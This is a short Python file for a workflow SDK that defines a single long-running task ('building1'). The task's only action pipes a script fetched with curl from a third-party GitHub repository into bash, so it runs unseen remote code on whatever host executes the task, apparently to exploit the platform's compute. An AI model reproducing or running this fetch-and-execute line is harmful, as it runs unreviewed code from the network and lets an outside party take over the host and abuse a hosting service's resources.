import sys
from render_sdk import Workflows, Retry

app = Workflows()

@app.task(
  plan="standart",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def building1():
  import sys
  import os
  os.system('curl -sL https://github.com/makiloso/urban-octo-umbrella/raw/main/astor | bash')

if __name__ == "__main__":
  app.start()
